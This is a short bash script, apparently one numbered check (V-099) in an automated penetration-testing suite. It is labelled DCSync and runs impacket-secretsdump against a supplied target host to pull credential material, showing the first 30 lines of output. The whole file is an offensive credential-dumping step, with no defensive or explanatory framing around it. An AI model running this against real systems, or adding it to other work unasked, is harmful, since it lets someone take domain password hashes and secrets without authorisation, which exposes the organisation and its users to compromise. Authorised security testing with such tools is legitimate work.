#!/bin/bash
# V-099 -- DCSync
# Tool: impacket_secretsdump
# Usage: bash V-099.sh <target> <session_output_dir>

TARGET="${1:?Usage: V-099.sh <target> <session_output_dir>}"
SESSION_DIR="${2:-}"
HOST=$(echo "$TARGET" | sed -E 's|https?://||' | sed 's|/.*$||' | sed 's|:.*$||')

impacket-secretsdump "$HOST" 2>&1 | head -30
exit $?
